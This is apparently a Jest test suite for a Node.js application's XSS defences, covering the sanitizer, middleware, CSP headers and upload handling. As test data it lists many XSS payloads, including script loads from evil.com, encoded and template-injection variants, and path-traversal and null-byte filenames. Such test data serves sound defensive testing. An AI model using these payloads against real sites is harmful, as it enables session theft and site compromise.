/**
 * Advanced XSS Prevention Tests
 * Tests for various XSS attack vectors and prevention mechanisms
 */

const request = require('supertest');
const app = require('../../src/app');
const inputSanitizer = require('../../src/services/inputSanitizationService');
const xssPrevention = require('../../src/middleware/xssPrevention');

describe('Advanced XSS Prevention Tests', () => {
  describe('Stored XSS Prevention', () => {
    test('should prevent basic script tag injection', () => {
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>',
        '<script src="http://evil.com/xss.js"></script>',
        '<script>document.cookie</script>',
        '<<SCRIPT>alert("XSS");//<</SCRIPT>'
      ];

      xssPayloads.forEach(payload => {
        const sanitized = inputSanitizer.sanitizeForHTML(payload);
        expect(sanitized).not.toContain('<script');
        expect(sanitized).not.toContain('</script>');
        expect(sanitized).not.toContain('alert(');
      });
    });

    test('should prevent event handler injection', () => {
      const eventHandlers = [
        '<img src=x onerror=alert("XSS")>',
        '<body onload=alert("XSS")>',
        '<div onmouseover="alert(\'XSS\')">',
        '<input onfocus=alert(1)>',
        '<svg onload=alert(1)>',
        '<iframe onload=alert(1)>',
        '<marquee onstart=alert(1)>'
      ];

      eventHandlers.forEach(payload => {
        const sanitized = inputSanitizer.sanitizeForHTML(payload);
        expect(sanitized).not.toMatch(/on\w+\s*=/i);
        expect(sanitized).not.toContain('alert(');
      });
    });

    test('should prevent iframe injection', () => {
      const iframePayloads = [
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<iframe src="http://evil.com"></iframe>',
        '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
        '<IFRAME SRC="javascript:alert(\'XSS\');"></IFRAME>'
      ];

      iframePayloads.forEach(payload => {
        const sanitized = inputSanitizer.sanitizeForHTML(payload);
        expect(sanitized).not.toContain('<iframe');
        expect(sanitized).not.toContain('</iframe>');
      });
    });
  });

  describe('Reflected XSS Prevention', () => {
    test('should sanitize URL parameters', async () => {
      const xssQueries = [
        '?search=<script>alert(1)</script>',
        '?name=<img src=x onerror=alert(1)>',
        '?callback=alert(document.cookie)',
        '?redirect=javascript:alert(1)'
      ];

      for (const query of xssQueries) {
        const response = await request(app)
          .get(`/api/search${query}`);
        
        expect(response.text).not.toContain('<script');
        expect(response.text).not.toContain('alert(');
        expect(response.text).not.toContain('onerror=');
      }
    });

    test('should prevent XSS in error messages', async () => {
      const response = await request(app)
        .get('/api/user/<script>alert(1)</script>');
      
      expect(response.text).not.toContain('<script>alert(1)</script>');
      expect(response.text).toContain('&lt;script&gt;alert(1)&lt;/script&gt;');
    });

    test('should sanitize form input reflection', async () => {
      const xssPayloads = [
        { username: '<script>alert(1)</script>' },
        { email: 'test@test.com<script>alert(1)</script>' },
        { bio: '<img src=x onerror=alert(1)>' }
      ];

      for (const payload of xssPayloads) {
        const response = await request(app)
          .post('/api/profile')
          .send(payload);
        
        const responseText = JSON.stringify(response.body);
        expect(responseText).not.toContain('<script');
        expect(responseText).not.toContain('onerror=');
      }
    });
  });

  describe('DOM-based XSS Prevention', () => {
    test('should escape data for JavaScript context', () => {
      const jsPayloads = [
        '</script><script>alert(1)</script>',
        '"; alert(1); "',
        '\'; alert(1); \'',
        '\\"; alert(1); //',
        '\n alert(1) \n'
      ];

      jsPayloads.forEach(payload => {
        const sanitized = inputSanitizer.sanitizeForHTML(payload, 'javascript');
        expect(sanitized).not.toContain('</script>');
        expect(sanitized).toContain('\\n');
        expect(sanitized).toContain("\\'");
      });
    });

    test('should prevent innerHTML-based XSS', () => {
      const innerHTMLPayloads = [
        '<img src=x onerror=alert(1)>',
        '<svg/onload=alert(1)>',
        '<math><mtext></mtext><mtext><script>alert(1)</script></mtext></math>',
        '<table><td background="javascript:alert(1)">',
      ];

      innerHTMLPayloads.forEach(payload => {
        const sanitized = inputSanitizer.sanitizeForHTML(payload);
        expect(sanitized).not.toContain('javascript:');
        expect(sanitized).not.toContain('onload=');
        expect(sanitized).not.toContain('onerror=');
      });
    });

    test('should sanitize data for attribute context', () => {
      const attrPayloads = [
        '" onmouseover="alert(1)',
        '\' onmouseover=\'alert(1)',
        '"><script>alert(1)</script>',
        'javascript:alert(1)'
      ];

      attrPayloads.forEach(payload => {
        const sanitized = inputSanitizer.sanitizeForHTML(payload, 'attribute');
        expect(sanitized).not.toContain('"');
        expect(sanitized).not.toContain('\'');
        expect(sanitized).not.toContain('<');
        expect(sanitized).not.toContain('>');
      });
    });
  });

  describe('Advanced XSS Vectors', () => {
    test('should prevent SVG-based XSS', () => {
      const svgPayloads = [
        '<svg><script>alert(1)</script></svg>',
        '<svg/onload=alert(1)>',
        '<svg><animate onbegin=alert(1)>',
        '<svg><a xlink:href="javascript:alert(1)"><text>click</text></a></svg>',
        '<svg><foreignObject><iframe src=javascript:alert(1)></iframe></foreignObject></svg>'
      ];

      svgPayloads.forEach(payload => {
        const sanitized = inputSanitizer.sanitizeForHTML(payload);
        expect(sanitized).not.toContain('<svg');
        expect(sanitized).not.toContain('javascript:');
        expect(sanitized).not.toContain('onload=');
      });
    });

    test('should prevent CSS injection', () => {
      const cssPayloads = [
        'expression(alert(1))',
        'url(javascript:alert(1))',
        'behavior: url(xss.htc)',
        '@import "http://evil.com/xss.css"',
        'content: url(javascript:alert(1))'
      ];

      cssPayloads.forEach(payload => {
        const sanitized = inputSanitizer.sanitizeForHTML(payload, 'css');
        expect(sanitized).not.toContain('expression');
        expect(sanitized).not.toContain('javascript:');
        expect(sanitized).not.toContain('behavior:');
        expect(sanitized).not.toContain('@import');
      });
    });

    test('should prevent data URI XSS', () => {
      const dataURIPayloads = [
        'data:text/html,<script>alert(1)</script>',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
        'data:image/svg+xml,<svg onload=alert(1)>',
        'data:application/x-javascript,alert(1)'
      ];

      dataURIPayloads.forEach(payload => {
        const sanitized = inputSanitizer.sanitizeForHTML(payload, 'url');
        expect(sanitized).toBe(''); // Invalid protocol
      });
    });
  });

  describe('Encoding and Character Set Attacks', () => {
    test('should handle UTF-7 encoding attacks', () => {
      const utf7Payloads = [
        '+ADw-script+AD4-alert(1)+ADw-/script+AD4-',
        '+ADw-img src=x onerror=alert(1)+AD4-'
      ];

      utf7Payloads.forEach(payload => {
        const sanitized = inputSanitizer.sanitizeForHTML(payload);
        expect(sanitized).not.toContain('script');
        expect(sanitized).not.toContain('alert');
      });
    });

    test('should handle HTML entity encoding attacks', () => {
      const entityPayloads = [
        '&lt;script&gt;alert(1)&lt;/script&gt;',
        '&#60;script&#62;alert(1)&#60;/script&#62;',
        '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',
        '&lt;img src=x onerror=&quot;alert(1)&quot;&gt;'
      ];

      entityPayloads.forEach(payload => {
        const sanitized = inputSanitizer.sanitizeForHTML(payload);
        // Double encoding should be prevented
        expect(sanitized).not.toContain('&lt;script&gt;');
      });
    });

    test('should handle Unicode normalization attacks', () => {
      const unicodePayloads = [
        '\u003Cscript\u003Ealert(1)\u003C/script\u003E',
        '\u0022onmouseover=\u0022alert(1)',
        'ſcript>alert(1)</script>', // Using Latin small letter long s
      ];

      unicodePayloads.forEach(payload => {
        const sanitized = inputSanitizer.sanitizeForHTML(payload);
        expect(sanitized).not.toContain('script>');
        expect(sanitized).not.toContain('alert(');
      });
    });
  });

  describe('Content Security Policy', () => {
    test('should set proper CSP headers', async () => {
      const response = await request(app)
        .get('/api/test');
      
      expect(response.headers['content-security-policy']).toBeDefined();
      expect(response.headers['content-security-policy']).toContain("script-src 'self'");
      expect(response.headers['content-security-policy']).toContain("object-src 'none'");
    });

    test('should implement nonce-based CSP', async () => {
      const response = await request(app)
        .get('/api/page-with-inline-script');
      
      const csp = response.headers['content-security-policy'];
      expect(csp).toMatch(/script-src.*'nonce-[\w+/=]+'/);
    });

    test('should block inline scripts without nonce', () => {
      const cspConfig = inputSanitizer.getContentSecurityPolicy();
      expect(cspConfig.directives.scriptSrc).toContain("'strict-dynamic'");
      expect(cspConfig.directives.scriptSrc).not.toContain("'unsafe-inline'");
    });
  });

  describe('XSS Prevention Middleware', () => {
    test('should add security headers', async () => {
      const response = await request(app)
        .get('/api/test');
      
      expect(response.headers['x-xss-protection']).toBe('1; mode=block');
      expect(response.headers['x-content-type-options']).toBe('nosniff');
      expect(response.headers['x-frame-options']).toBe('DENY');
    });

    test('should sanitize all request inputs', async () => {
      const response = await request(app)
        .post('/api/data')
        .send({
          name: '<script>alert(1)</script>',
          description: '<img src=x onerror=alert(1)>',
          tags: ['<b>tag1</b>', '<script>tag2</script>']
        });
      
      expect(response.body.name).not.toContain('<script');
      expect(response.body.description).not.toContain('onerror=');
      expect(response.body.tags[1]).not.toContain('<script');
    });

    test('should handle nested object sanitization', async () => {
      const response = await request(app)
        .post('/api/complex-data')
        .send({
          user: {
            name: '<script>alert(1)</script>',
            profile: {
              bio: '<img src=x onerror=alert(1)>',
              links: ['<a href="javascript:alert(1)">link</a>']
            }
          }
        });
      
      expect(JSON.stringify(response.body)).not.toContain('<script');
      expect(JSON.stringify(response.body)).not.toContain('javascript:');
      expect(JSON.stringify(response.body)).not.toContain('onerror=');
    });
  });

  describe('Template Injection Prevention', () => {
    test('should prevent server-side template injection', () => {
      const templatePayloads = [
        '{{7*7}}',
        '${7*7}',
        '<%= 7*7 %>',
        '#{7*7}',
        '{{constructor.constructor(\'alert(1)\')()}}'
      ];

      templatePayloads.forEach(payload => {
        const sanitized = inputSanitizer.sanitizeForHTML(payload);
        expect(sanitized).not.toContain('{{');
        expect(sanitized).not.toContain('${');
        expect(sanitized).not.toContain('<%');
      });
    });

    test('should prevent client-side template injection', () => {
      const angularPayloads = [
        '{{constructor.constructor(\'alert(1)\')()}}',
        '{{$on.constructor(\'alert(1)\')()}}',
        '{{\'a\'.constructor.prototype.charAt=[].join;$eval(\'x=alert(1)\');}}'
      ];

      angularPayloads.forEach(payload => {
        const sanitized = inputSanitizer.sanitizeForHTML(payload);
        expect(sanitized).not.toContain('constructor');
        expect(sanitized).not.toContain('{{');
      });
    });
  });

  describe('File Upload XSS Prevention', () => {
    test('should sanitize uploaded filenames', () => {
      const maliciousFilenames = [
        '<script>alert(1)</script>.jpg',
        '"><img src=x onerror=alert(1)>.png',
        '../../../etc/passwd',
        'file.jpg<svg onload=alert(1)>',
        'file.php\x00.jpg'
      ];

      maliciousFilenames.forEach(filename => {
        const sanitized = inputSanitizer.sanitizeFilename(filename);
        expect(sanitized).not.toContain('<');
        expect(sanitized).not.toContain('>');
        expect(sanitized).not.toContain('..');
        expect(sanitized).not.toContain('\x00');
      });
    });

    test('should validate file content types', async () => {
      const response = await request(app)
        .post('/api/upload')
        .attach('file', Buffer.from('<script>alert(1)</script>'), {
          filename: 'test.jpg',
          contentType: 'text/html'
        });
      
      expect(response.status).toBe(400);
      expect(response.body.error).toContain('Invalid file type');
    });
  });

  describe('JSON XSS Prevention', () => {
    test('should prevent XSS in JSON responses', async () => {
      const response = await request(app)
        .get('/api/user/profile')
        .set('Accept', 'application/json');
      
      // Ensure proper content type
      expect(response.headers['content-type']).toContain('application/json');
      
      // Check that response doesn't contain unescaped HTML
      const responseText = JSON.stringify(response.body);
      expect(responseText).not.toContain('<script');
      expect(responseText).not.toContain('</script>');
    });

    test('should escape JSON for safe embedding in HTML', () => {
      const jsonData = {
        message: '</script><script>alert(1)</script>',
        html: '<img src=x onerror=alert(1)>'
      };

      const escaped = inputSanitizer.sanitizeJSON(JSON.stringify(jsonData));
      expect(JSON.stringify(escaped)).not.toContain('</script>');
      expect(JSON.stringify(escaped)).not.toContain('onerror=');
    });
  });
});